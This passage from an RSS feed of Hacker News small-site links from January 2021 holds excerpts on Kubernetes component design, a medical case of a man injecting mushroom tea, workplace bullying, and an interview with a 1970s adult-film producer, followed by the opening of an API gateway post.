<p>The biggest advantage of Kubernetes in my opinion is the encapsulation and composability of backend components. Any Saas product has to run a number of components from database, appserver, monitoring stack, pub/sub etc etc. Kubernetes makes everything a helm chart and some configuration away. The interfaces are neatly defined by the author of the helm chart and all the complexity is encapsulated well within a service. You could use many third party helm charts:
Monitoring: logging - Elasticsearch
Monitoring: metrics - Prometheus
Authentication - FusionAuth
Database - MongoDB
Chaos Monkey - Gremlin
CD - Argo
…
This abstraction of complexity lets every team focus on its unique IP and easily reuse third party components. Now why was it not possible before? VM images were too big, needed a lot of time to boot and it was hard to maintain a lot of them.</p>

<p>Composability is not just limited to third party components. Even your own code becomes very composable with well defined interfaces. Now how should we decide the boundary between two components in a Kubernetes cluster? The same priciples that apply in designing a database or paritioning a program to classes is useful here but with slightly different parameters. When we decide what should go into a class, we use the priciple of loose coupling and strong cohesion: The interface between classes
should be simple and the complexity can be captured inside the class. Also, strong cohesion means methods and properties inside the class should be related to each other: they should change together. A change in behavior should as much as possible be confined within the class.</p>

<p>Choosing the boundary of Kubernetes components depends on a few things apart from the Simplicity of the interface: 
Single process: Everything in one component should run as a single process/container. It should have the same dependencies. You dont really have to worry about this because you pretty much have little choice.
Configurability of the component: IF a configuration change requires the restart of certain parts, they should be in the same component.
Auto-scaling policies for the component. If one component is CPU bound and needs CPU scaling whereas other needs Memory based autoscaling, they should be in different components.
We should strive to decouple state of the containers from the runtime as much as possible, by using databases and volume claims. But ideally one component should not have too many different types of state.</p>

<p>It can also be thought of as taking a UML component diagram and giving each component a container of its own. The concept of components in UML closely resembles an image.</p>

<p>Now, let’s say someday that the component configuration is super easy and the  configuration/maintenance of these components rests in the hands of the creator of the component itself (for a fee of course).  The frontend app developer would go hire some of these backend components, configure them together and a new app is ready to run! The road will not be easy but this will be true low-code where complex services can be built by just knowing UI programming.</p>

</article>










  




      </div>
    </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://lab.computer/static/blogs_p/jekyll/pixyll/2020/10/10/k8s-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786449</guid>
            <pubDate>Fri, 15 Jan 2021 02:58:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man almost dies after self treatment with mushrooms]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786331">thread link</a>) | @seshagiric
<br/>
January 14, 2021 | https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/ | <a href="https://web.archive.org/web/*/https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

			
	<section id="primary">
		<main id="main" role="main">
				
		
<article id="post-19849">

	<!-- .entry-header -->

	<img width="820" height="360" src="https://mybestmedicine.com/wp-content/uploads/sites/13/2021/01/cfarmafotohiP2ud53Apg2xNB6uZbNe7-1200-80-820x360.jpg" alt="" loading="lazy">
	<div>

		<p>A man brewed a tea from “magic mushrooms” and injected the concoction into his veins; several days later, he ended up at the emergency department with the fungus growing in his blood.</p>
<p>The man spent 22 days in the hospital, with eight of those days in the intensive care unit (ICU), where he received treatment for multisystem organ failure. Now released, he is still being treated with a long-term regimen of antibiotic and antifungal drugs, according to a description of the case published Jan. 11 in the <u>Journal of the Academy of Consultation-Liaison Psychiatry</u>.&nbsp;</p>
<p>The case didn’t reveal whether injecting <u>shroom tea</u> can cause persistent psychoactive effects, as sometimes seen when people ingest the <u>fungus</u> orally, the doctors wrote in the report. For example, in rare cases, people can develop a condition called hallucinogen-induced persisting perception disorder (HPPD), where they experience vivid flashbacks of their trip long after the fact, <u>according to the National Institute on Drug Abuse</u>.&nbsp;</p>
<p>The case “underscores the need for ongoing public education regarding the dangers attendant to the use of this, and other drugs, in ways other than they are prescribed,” the doctors wrote.&nbsp;</p>

<p>By injecting shrooms into his bloodstream, the 30-year-old patient had hoped to relieve symptoms of bipolar disorder and opioid dependence, according to the report. His family members noted that he had recently stopped adhering to his prescribed bipolar medications and was “cycling between depressive and manic states.”&nbsp;</p>
<p>The man found online reports that described the potential therapeutic effects of hallucinogens, such as <u>LSD</u> and psilocybin mushrooms, which prompted him to boil down shrooms into a “mushroom tea.” He filtered the tea by drawing it through a “cotton swab” before injecting it into his body. In the following days, he became lethargic and nauseated, and his skin began to yellow. He soon developed diarrhea and began vomiting blood.&nbsp;</p>
<p>His family found him and took him to the emergency room, noting concern that he also seemed very confused. The doctors noted that he could not participate in a meaningful interview, due to his altered mental state. Multiple organs, including the liver and kidneys, began to fail and the man was transferred to the ICU. His blood tested positive for a <u>bacterial</u> infection with the microbe <em>Brevibacillus </em>and a fungal infection from <em>Psilocybe cubensis </em>— meaning the magic mushroom he injected was now growing in his blood.</p>
<p>In addition to antibiotic and antifungal drugs, the man needed to be placed on a ventilator after he experienced acute respiratory failure, where fluid builds up in the air sacs of the lungs. Thankfully, the patient survived this ordeal and was later discharged from the hospital.</p>
<p>—Psychiatry’s new guide: 6 things you should know</p>
<p>—10 of the strangest medical studies (in recent history, that is)</p>
<p>—Hypersex to hoarding: 7 new psychological disorders&nbsp;</p>
<p>Research suggests that psilocybin may be a promising treatment for <u>depression</u>, <u>anxiety</u> and substance abuse, the authors noted — but only if taken safely. In most research studies, scientists administer the drug in pill form, but in a few instances, doctors have delivered psilocybin via an intravenous injection, according to a 2018 report published in the journal <u>Neuropharmacology</u>. But these injections are given in tightly controlled doses and under medical supervision, and they do not contain any fungi; the compound psilocybin, alone, is not alive and cannot grow in the body.</p>
<p>When used recreationally, magic mushrooms are typically made into a tea, eaten raw or dried, ground into a powder and put in capsules, or coated in chocolate — they are not injected directly into the bloodstream. Shrooms induce mind-altering trips by interacting with certain receptors in the brain; specifically, the psilocybin breaks down into psilocin, a substance that acts like the brain chemical serotonin, which plays roles in mood and perception.</p>
<p>But a bad trip can trigger anxiety, fear and confusion, as well as elevated blood pressure, vomiting, headaches and stomach cramps, <u>Live Science previously reported</u>. Magic mushrooms carry an added risk because they resemble some species of poisonous mushroom, so people sometimes consume the wrong kind by mistake.&nbsp;</p>
<p>Several U.S. cities have decriminalized psilocybin, and in November 2020, Oregon moved to legalize its use as a therapeutic drug, <u>CNBC reported</u>. As of now, psilocybin is still classified as a “Schedule I substance” under federal law, meaning that the drug has no accepted medical use in the U.S. and has a “high potential for abuse.” However, current research suggests that this potential for abuse has been historically overestimated and is actually quite low, according to the 2018 Neuropharmacology report.&nbsp;</p>
<p><em>Originally published on Live Science.</em>&nbsp;</p>
<p>Source: <a href="https://www.livescience.com/magic-mushroom-injection-case-report.html" target="_blank" rel="noopener noreferrer">Read Full Article</a></p>

<!-- AI CONTENT END 2 -->

		
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

</article>

<!-- #comments -->
		
		</main><!-- #main -->
	</section><!-- #primary -->
	
	
	<!-- #secondary -->

	
	
	</div></div>]]>
            </description>
            <link>https://mybestmedicine.com/health-news/magic-mushrooms-grow-in-mans-blood-after-injection-with-shroom-tea/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786331</guid>
            <pubDate>Fri, 15 Jan 2021 02:44:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Play a web-based visual piano using MIDI or ordinary keyboard]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25786300">thread link</a>) | @svikashk
<br/>
January 14, 2021 | https://dotpiano.com/395v798Z7xr | <a href="https://web.archive.org/web/*/https://dotpiano.com/395v798Z7xr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dotpiano.com/395v798Z7xr</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786300</guid>
            <pubDate>Fri, 15 Jan 2021 02:39:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bullies Are Bad for Business]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25786190">thread link</a>) | @heygee
<br/>
January 14, 2021 | https://apptrafficly.com/bullies-are-bad-for-business/ | <a href="https://web.archive.org/web/*/https://apptrafficly.com/bullies-are-bad-for-business/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <!-- Content Header (Page header) -->
    <div>
      <div>
        <div>
          <!-- /.col -->
          <div>
            <ol>
              <li><a href="https://apptrafficly.com/">Home</a></li>
              <li>Bullies Are Bad For Business!</li>
            </ol>
          </div><!-- /.col -->
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->   
    

    <!-- Main content -->
    <section>

      <!-- Default box -->
      <div>
        <!-- <div class="card-header">
          <h3 class="card-title">Bullies Are Bad For Business!</h3>
        </div> -->
        <div>
          <div>            
            <div>
                <p>A workplace bully negatively affects everyone.&nbsp;Workplace Bullies are always bad for business. The workplace bully is around because the company condones and rewards him or her.&nbsp;According to Sarah Tracy, director of the Project for Wellness and Work-Life at Arizona State University, “There are a number of workplace cultures that encourage bullying because of high levels of competition.” However, that’s not the only reason for workplace bullying. It’s also a pretext for all types of workplace discrimination.&nbsp;Hello, I’m Yancey with vivid memories of Darrell towering over us in the fourth grade! He would line us up every morning and take our lunch money.</p>
<p>I remember going home and crying to my mother about it thinking I was going get empathy. She “cleaned my clock” and said “Don’t you let that boy take your lunch money. I’ll call your teacher to make sure”. Now I was in a real jam. I had to decide who I was most afraid of Darrell or mom. Well the next morning I stood my ground, fought and got beat up, but kept my lunch money. After that I never had any more problems with Darrell. Standing up to bullies in the workplace can be just as frightening for some bully victims. Bullying on the job can take many forms. These can include…</p>
<ul>
<li>psychological abuse</li>
<li>physical abuse</li>
<li>emotional abuse</li>
<li>verbal and non verbal abuse</li>
</ul>
<p>The bully may attempt to manipulate or destroy the victims work product. According to Wikipedia, <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullying</a>, “is the tendency of individuals or groups to use persistent aggressive or unreasonable behavior against a co-worker”. I would have to expand on that definition because I have personally witnessed employees bullying other employees, customers, vendors, visitors and other interested parties as well! I have also several individuals attempt to bully me on the job.&nbsp;Bullies unfortunately, are a part of society in general.&nbsp;A lot of times office bullies use or pervert their power in the workplace. The bully tactics include<br>
degrading, humiliating, insulting, affronting and intimidating the “target” of their abuse.</p>
<p>Many times this behavior is done in front of witnesses designed to destroys an individuals self esteem. In a bullying workplace trust is nonexistent especially when management allows or approves it. When employees or supervisors are aware of workplace bullying and do nothing to correct it they share in the negative consequences. Witnesses should be empowered to report such behavior and organizations must punish the “bully”. Unfortunately, the office bully is often the supervisor or manager. When there is an environment of distrust in the workplace, employees may not be willing to do their best and moral will be low. Studies show about a third of American workers have been exposed to <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullies</a>!</p>
<p>My first day in local government as an IT (information technology) professional was a dazzling display of workplace bullying. The supervisor after my orientation made this statement. “_____ is going to be training you. He’s upset because I got this job and he didn’t.” I thought that was a very curious statement for him to make.&nbsp;He then told me to go take a seat in the work area with this individual to start my training. From that point on for fully nine months I was exposed to behaviors like this. “Excuse me __________, what does this system message mean?” The individual sitting four feet from me ignored me as if I didn’t exist.</p>
<p>A female co-worker said, “He does that to me all the time.” Have you told the supervisor about this, I asked. She said the supervisor was aware of it. The female coworker had been employed there about three months before I got there.&nbsp;The department bully did everything he could to hinder our training and development. When the female co-worker and I would in essence train ourselves the bully would make loud comments to make us look stupid or incompetent. When asked about a specific job task he yelled, “That’s really complicated computer stuff, you wouldn’t understand it!” The bully, a white male made that statement to a person of a different ethnicity. Now the bully had crossed over into ethnic harassment territory. Again when management was given notice it did nothing to correct the situation.</p>
<p>I was thoroughly mystified at the blatant level of arrogant indifference management displayed in response to this employee. I was to learn later, the employee had a history of bullying individuals in and outside the department. These included&nbsp;other employees, managers, vendors, sales people and elected officials.&nbsp;Remember, I’m talking about the local government of a mid-sized U.S. city! Never in my previous thirty plus years in the American workplace have I ever experienced and witnessed a greater example of what a bully in the workplace looks like! According to some researchers the following are most common tactics used by bullies in the workplace…</p>
<ul>
<li>falsely accusing the target(s) of workplace mistakes</li>
<li>the silent treatment</li>
<li>yell at the target(s) with the intent to intimidate</li>
<li>make insults based on race, gender, disability, national origin,etc.</li>
<li>characterize the target as incompetent or unintelligent</li>
<li>trivialize the target(s) work product</li>
<li>demean the target(s) in front of others</li>
</ul>
<p>The bully in my former workplace has displayed all of these tactics and more!</p>
<p>Bullies come in all shapes and sizes in the workplace. In my opinion the greater the insecurity the greater the need for control. “<a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace terrorists</a>“, my name for them, are all about control. They come in four basic types:</p>
<p><strong>yellers</strong> – This kind of bully has to always talk over or down to the target(s).</p>
<p><strong>blockers</strong> – This type is great for slamming or trying to destroy the good work product of the target. He or she will also seek to undermine the reputation of the target as well.</p>
<p><strong>backstabbers</strong> – This classic office bully works in the shadows spreading ugly rumors, gossip and setting up traps against the target.</p>
<p><strong>nitpickers</strong> –&nbsp; This bully loves to find fault with everything the target does no matter how trivial. This type of bully will have negative criticism with any ideas the target suggests.</p>
<p>There are consequences for organizations fostering a culture of workplace bullying.&nbsp;Several studies reveal that job bullying resulting in psychological, physical and emotional abuse happens in all types of companies and organizations. Employees who are targets of intense bullying can develop…</p>
<ul>
<li>high levels of stress disorder</li>
<li>insomnia</li>
<li>strokes</li>
<li>migraine headaches</li>
<li>suicidal tendencies</li>
<li>low self esteem</li>
<li>depression</li>
<li>heightened risk of heart disease</li>
</ul>
<p>A national poll conducted by the Workplace Bullying Institute says 37 percent or 54 million American employees have or are being bullied in their employment. “Anything that affects 37 percent of the public is an epidemic. But, it’s a silent epidemic” according to Gary Namie Director of the Workplace Bullying Institute.&nbsp;Suzy Fox of Loyola of Chicago’s Institute of Human Resources and Employment Relations states, “since there aren’t laws to enforce anti-bullying workplaces, businesses should develop organizational policies that strictly outline behavior that is not acceptable in the office.” Fox further states, workplaces are “very similar to where we were with sexual harassment 15 years ago before there policies…and court decisions.”</p>
<p>Workplace bullying can also manifest into what’s called “mobbing”.&nbsp; This form of bullying at work involves being bullied by two more people per attack. Employees who are subjected to witnessing a bully in action against a co-worker have increased levels of stress and low morale.&nbsp;Since there are no federal laws against workplace bullying many companies do little or nothing about.&nbsp;But, like sexual harassment handling bullies is getting more attention because it’s proving to be bad for business.&nbsp;Because there are no laws in place, there is no clear definition of what <a href="https://www.e-junkie.com/ecom/gb.php?cl=140727&amp;c=ib&amp;aff=82668">workplace bullying</a> is. That means it can be hard to distinguish from other behaviors such as retaliation, sexual and racial harassment.</p>
<p>Harassment by definition is offensive or unwelcome conduct that adversely affects an individual’s condition of employment.&nbsp;Harassment is linked to individuals in a protected classes such as…</p>
<p>race (ethnicity)</p>
<p>national origin</p>
<p>gender</p>
<p>disability</p>
<p>religion</p>
<p>In my opinion, the lines are blurred in the absence of a legally defined law concerning bullying in the workplace. I have witnessed and experienced individuals on the job who have exhibited various forms of harassment.&nbsp; How can harassment and hostility be directed toward any individual in the workplace and not also meet the standard for being a bully?&nbsp;Up to this point the federal government has no job bully laws. Businesses and organizations don’t have uninform policies to prevent and punish it. According to Wikipedia the U.S. has yet to pass comprehensive workplace bullying legislation nor has any state government. Legislatures in 29 states have introduced&nbsp;workplace anti-bullying bills&nbsp;in recent years, according to the Healthy Workplace Campaign.</p>
<p>Companies that have an environment encouraging bullying as an accepted business practice become corporate or institutional bullying. Some experts believe the constant growth of the economy over the last 20 years is partly to blame.&nbsp;Employers promoted individuals into management positions who were not qualified with no interpersonal skills or training because these jobs were hard to fill.&nbsp;Businesses that encourage bully bosses have high employee absenteeism and turnover. Research also shows increased levels of stress and sick leave taken. Who can blame them? There have been many instances when I didn’t want to go to work because of the bully in my workplace. I never allowed the individual to&nbsp; intimidate me, however the workplace had a poisonous negative atmosphere that was nurtured and condoned by …</p></div></div></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://apptrafficly.com/bullies-are-bad-for-business/">https://apptrafficly.com/bullies-are-bad-for-business/</a></em></p>]]>
            </description>
            <link>https://apptrafficly.com/bullies-are-bad-for-business/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25786190</guid>
            <pubDate>Fri, 15 Jan 2021 02:24:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Psychic Who Funded Porn, the Swami, and the Jonestown Massacre]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25785853">thread link</a>) | @mathgenius
<br/>
January 14, 2021 | https://www.therialtoreport.com/2021/01/10/beau-buchanan/ | <a href="https://web.archive.org/web/*/https://www.therialtoreport.com/2021/01/10/beau-buchanan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
			<p><strong><a href="https://www.imdb.com/name/nm0117977/">Beau Buchanan</a> had an&nbsp;interesting life.</strong></p>
<p><strong>He was a child actor who appeared on stage and on the big screen in <a href="https://www.imdb.com/title/tt0047885/reference">Blackboard Jungle</a> (1954), he worked on an&nbsp;Academy Award-winning documentary, was production manager on many early New York adult films, d</strong><strong>iscovered <a href="https://www.therialtoreport.com/2013/05/19/podcast-011-georgina-spelvin-the-devil-miss-jones-and-the-new-york-years/">Georgina Spelvin</a> before she appeared in <a href="https://www.therialtoreport.com/2015/09/19/devil-in-miss-jones/">Devil in Miss Jones</a>, flew planes</strong><strong>, was the&nbsp;personal assistant to a notable spiritual guru, formed a porn-producing partnership with a famous psychic, made t</strong><strong>he most ambitious and expensive of 1970s sex films,&nbsp;became a pioneer in&nbsp;</strong><strong>video distribution, was a&nbsp;key player in the&nbsp;investigation of the <a href="https://en.wikipedia.org/wiki/Jonestown">Jonestown</a> murders, and sailed across the Atlantic single-handedly.</strong></p>
<p><strong>Let’s admit it: People who made pornographic films in the 1970s were sometimes more interesting&nbsp;than those today…</strong></p>
<p><strong>This is The <a href="https://www.therialtoreport.com/">Rialto Report</a>‘s interview with Beau Buchanan.</strong></p>
<p>___________________________________________________________________________________</p>
<h2><span><strong>1. &nbsp; &nbsp; Beau Buchanan – Beginnings:</strong></span></h2>
<p><strong>You lived and worked in New York for all of your adult film career, but you’re not from New York?</strong></p>
<p>That’s right. My life started in California when I was born November 22, 1937.</p>
<p><strong>Were you interested in movies from an early age?</strong></p>
<p>Actually, ever since I can remember, as a kid, I wanted to be an actor. I wrote and performed plays in the basement of our house when we were young. As I grew older, I auditioned for parts in plays. Not just in California either: I worked in a stock company in Mexico when I was 12, and later my sister and I had roles in the off-Broadway production of ‘The Innocents.’</p>
<p>Then I was in a production of ‘Oedipus Rex.’</p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-The_Los_Angeles_Times_Wed__Apr_26__1961_.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-The_Los_Angeles_Times_Wed__Apr_26__1961_.jpg" alt="Beau Buchanan" width="648" height="566" srcset="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-The_Los_Angeles_Times_Wed__Apr_26__1961_.jpg 648w, https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-The_Los_Angeles_Times_Wed__Apr_26__1961_-300x262.jpg 300w" sizes="(max-width: 648px) 100vw, 648px"></a></p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Citizen_News_Sat__Apr_15__1961_.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Citizen_News_Sat__Apr_15__1961_.jpg" alt="Beau Buchanan" width="570" height="648" srcset="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Citizen_News_Sat__Apr_15__1961_.jpg 570w, https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Citizen_News_Sat__Apr_15__1961_-264x300.jpg 264w" sizes="(max-width: 570px) 100vw, 570px"></a><em>Early mention of Beau in a theater production of ‘Oedipus Rex’</em></p>
<p><strong>Did you get any acting roles in films?</strong></p>
<p>Yes, several. My first movie role was in the MGM film <a href="https://www.imdb.com/title/tt0047885/reference">Blackboard Jungle</a> (1955), which turned out to be a big hit. It was about an interracial inner-city school, and <a href="https://www.imdb.com/name/nm0112218/">Richard Brooks</a> was the director. He visited schools in Los Angeles in 1954 to cast the roles of the kids, and I got a small featured part in it. Nowadays it’s best known for the rock and roll soundtrack and also because it had a black actor, Sidney Poitier, in a lead role.</p>
<p>The casting agent said they wanted everybody to be over 18 when the film was shot. I was 16 and he asked me how old I was. I said, “I’ll be 18 in November” which was not a lie: it just wasn’t November that year. I spent a lot of time being tutored on set in between the acting.</p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Blackboard-Jungle-02.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Blackboard-Jungle-02.jpg" alt="Blackboard Jungle" width="424" height="648" srcset="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Blackboard-Jungle-02.jpg 424w, https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Blackboard-Jungle-02-196x300.jpg 196w" sizes="(max-width: 424px) 100vw, 424px"></a></p>
<p><strong>What was it like to be part of such a successful film?</strong></p>
<p>It was really tremendous because the film broke all records and it was a big surprise. When it opened, I was on an anthropological expedition in Guatemala, and when I came out of the jungle my friends called and told me, “The film is just breaking all the records and people are dancing in the aisles.”</p>
<p>It was great: I met Sidney Poitier, Glenn Ford and Vic Morrow.</p>
<p><strong>Did you continue acting after that?</strong></p>
<p>I did some acting here and there. I did some directing too. I taught theater at a school, and then I became interested in working in television. The problem was that none of these jobs paid much, and as much as I liked film, I always liked to make money too. I was entrepreneurial, and so I had a number of businesses – like a parking business, and I was an excavator and grading contractor too!</p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Valley_Times_Today_Thu__Sep_15__1960_.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Valley_Times_Today_Thu__Sep_15__1960_.jpg" alt="Beau Buchanan" width="505" height="648" srcset="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Valley_Times_Today_Thu__Sep_15__1960_.jpg 505w, https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-Valley_Times_Today_Thu__Sep_15__1960_-234x300.jpg 234w" sizes="(max-width: 505px) 100vw, 505px"></a><em>Review of Beau Buchanan on stage</em></p>
<p><strong>How long did you stay in California?</strong></p>
<p>In the late 1960s, I moved up to Seattle. I had a business failure, and I lost a lot of money. I was completely broke, so I decided to move to Australia to get away from everyone. But in the end I stayed, and moved to Seattle.</p>
<p>In Seattle, I worked at a local TV station. There were two films companies in town and I got a job offer from both of them the same day. But I stayed freelance because I wanted to be independent – that stayed with me my whole life. I always worked for myself.</p>
<p>The guys at the TV station would say, “Beau, why don’t you come onto our staff? Then if things slow down, you’ll still have a job.” I said, “If things slow down, I don’t want to be here!”</p>
<p><strong>Being freelance meant you had more flexibility for whom you worked?</strong></p>
<p>Yes. For example, I worked on a film that won an Academy Award. It was an environmental documentary called <a href="https://archive.org/details/theredwoods">The Redwoods</a>. The film was made as part of a campaign for a national park to protect the redwood forests.</p>
<p><strong>What did you learn from your time at the TV station?</strong></p>
<p>It was a great opportunity because I worked with really, really talented film people. I got to do everything – from sweeping floors to directing, editing, shooting, and lighting. I even became an animator when I had an argument with the animator. He said, “Screw you, do it yourself” so I did!</p>
<p>I also worked as a technician on many films sets, including a few that were starting to do more risqué adult films.</p>
<p>*</p>
<h2><strong><span>2.&nbsp;&nbsp;&nbsp;&nbsp; Pornography in New York (1972)</span></strong></h2>
<p><strong>How did you end up in New York?</strong></p>
<p>I went to New York in 1969 looking for independent film work. By now, I was an experienced crew member, generally as a grip, best boy, or gaffer. I’d basically take any work that I could find, but since I was non-union and new to town, I found fewer opportunities. Many low budget films were sex films at that time… that’s how I got into it.</p>
<p><strong>What do you remember about the early X-rated scene in New York in the early 1970s?</strong></p>
<p>It was more than just a film movement. It was a rebellion. We wanted change, we wanted to do something different, and this was an opportunity. It was fun. We made it all up as we went along, we established the rules.</p>
<p>When I encountered the consensus that we couldn’t do something, I would look for a way to do it anyway – just to prove that our generation had no boundaries. Sometimes it was a technical question: for example, when I was working in Seattle for the TV station, they’d say, “You can’t use a strobe light.” That made me say, “Why not? Let’s try it and see what happens.”</p>
<p>In my case, I was excited because I could do everything. I could actually go out and make it happen.</p>
<p><strong>Were you surprised by the sexual permissiveness in films?</strong></p>
<p>Yes. It was a daring time, and I’m sure that people were attracted to it because of that.</p>
<p>I remember the actress <a href="https://www.therialtoreport.com/2020/02/09/deep-sleep-3/">Kim Pope</a> on one of the first film sets in New York. She used to be a teacher, and so she used a different name. She was there with her boyfriend, and he had no concerns about the fact that she was about to perform in a sex scene with a guy she’d never met.</p>
<p>That was all new to me.</p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-kim_pope_steve.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-kim_pope_steve.jpg" alt="Kim Pope" width="436" height="648" srcset="https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-kim_pope_steve.jpg 436w, https://www.therialtoreport.com/wp-content/uploads/2020/12/RR-kim_pope_steve-202x300.jpg 202w" sizes="(max-width: 436px) 100vw, 436px"></a><em>Kim Pope</em></p>
<p><strong>What was your impression of New York at the time?</strong></p>
<p>New York was always this tremendous pool of energy. There were a couple of times when I was essentially broke in New York in the early days – but there was always something you could do. It was such an exciting, dynamic place.</p>
<p>California had its own energy but it was much less than New York. Even when I was down and nearly out in the city, I would go scavenging on the streets and find some nice furniture that people just didn’t have room for.</p>
<p><strong>What do you remember about the people who worked on adult film sets?</strong></p>
<p>There were really some good, talented people that worked on the films, but they just couldn’t get a job in the mainstream movie world because there wasn’t enough work. So this was an opportunity to do something. This was an opportunity to make some money.</p>
<p>It was the first time in history that people were making explicit sex films on a regular basis…</p>
<p><strong>Did that lead to any unusual situations?</strong></p>
<p>I remember shooting heterosexual sex films for a director who was gay. His producer happened to be a psychiatrist, and so this psychiatrist handed out drugs to anyone on set who wanted them. On one occasion, we’d almost finished the shoot, but the lead actor wasn’t able to get it up because he’d taken so many pills. So the producer offered a bonus, $50, to the first guy who could step in, get it up, and finish the shot. It was kind of funny to see these crew members standing around whacking off in competition to see who could do the scene.</p>
<p><strong>Do you remember any directors in particular?</strong></p>
<p>My first movie was for <a href="https://www.imdb.com/name/nm0457046/">Leonard Kirtman</a>. He gave a start to many aspiring filmmakers. He didn’t pay well, in fact he paid nothing, but you could learn a lot.</p>
<p>Lenny Kirtman was a phenomenon; he had this building, a three-story brownstone, on the Upper West Side in the 70s, and he would shoot 60 minute softcore films. He’d shoot three each weekend, and they’d be shot at the same time in different rooms. He’d go from room to room, change the bed, move the furniture around, and then shoot another scene.&nbsp; The movies would have a very loose kind of storyline, and he’d hire first-time people to appear in or work on the films. They probably didn’t realize that they were appearing in three different films! They had no idea. It didn’t matter. The performers didn’t really care what the storyline was, there wasn’t enough storyline to require a script. I think his budgets for films were something like $1,500…</p>
<p>But Leonard was a massive producer of these very low budget films. Later on, he moved away from softcore features to shoot hardcore films. But in my first New York years, he was king of the early sex film business in New York.</p>
<p><a href="https://www.therialtoreport.com/wp-content/uploads/2018/02/RR-Kirtman-01-1.jpg"><img loading="lazy" src="https://www.therialtoreport.com/wp-content/uploads/2018/02/RR-Kirtman-01-1.jpg" alt="Leonard Kirtman" width="527" height="648" srcset="https://www.therialtoreport.com/wp-content/uploads/2018/02/RR-Kirtman-01-1.jpg 527w, https://www.therialtoreport.com/wp-content/uploads/2018/02/RR-Kirtman-01-1-244x300.jpg 244w" sizes="(max-width: 527px) 100vw, 527px"></a><em>Leonard Kirtman’s prospectus, raising money for his film company, Kirt Films, in 1971</em></p>
<p><strong>What was Lenny like as a person?</strong></p>
<p>Lenny was in it for the money. He was essentially a business man. He had a large ego too.&nbsp;I found him fascinating though, and one day I decided to make a documentary about him and call it ‘The Snake in the Big Apple.’</p>
<p>I wanted to document Lenny himself – the man and his methods. I knew he was a unique and semi-important figure, and that would make a compelling documentary so I started shooting it.</p>
<p>I wanted to film him directing an S&amp;M scene, and we got a gal who was a dominatrix and a guy who agreed to be the submissive.</p>
<p>Unfortunately, the actor was late getting to the set, and by the time he arrived he was a nervous wreck. We eventually got him calmed down enough to start shooting, but he was temperamental and at some point, he just blew up and started yelling at Lenny, …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.therialtoreport.com/2021/01/10/beau-buchanan/">https://www.therialtoreport.com/2021/01/10/beau-buchanan/</a></em></p>]]>
            </description>
            <link>https://www.therialtoreport.com/2021/01/10/beau-buchanan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25785853</guid>
            <pubDate>Fri, 15 Jan 2021 01:43:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building DigitalOcean's internal API gateway]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25785808">thread link</a>) | @mlinhares
<br/>
January 14, 2021 | https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html | <a href="https://web.archive.org/web/*/https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
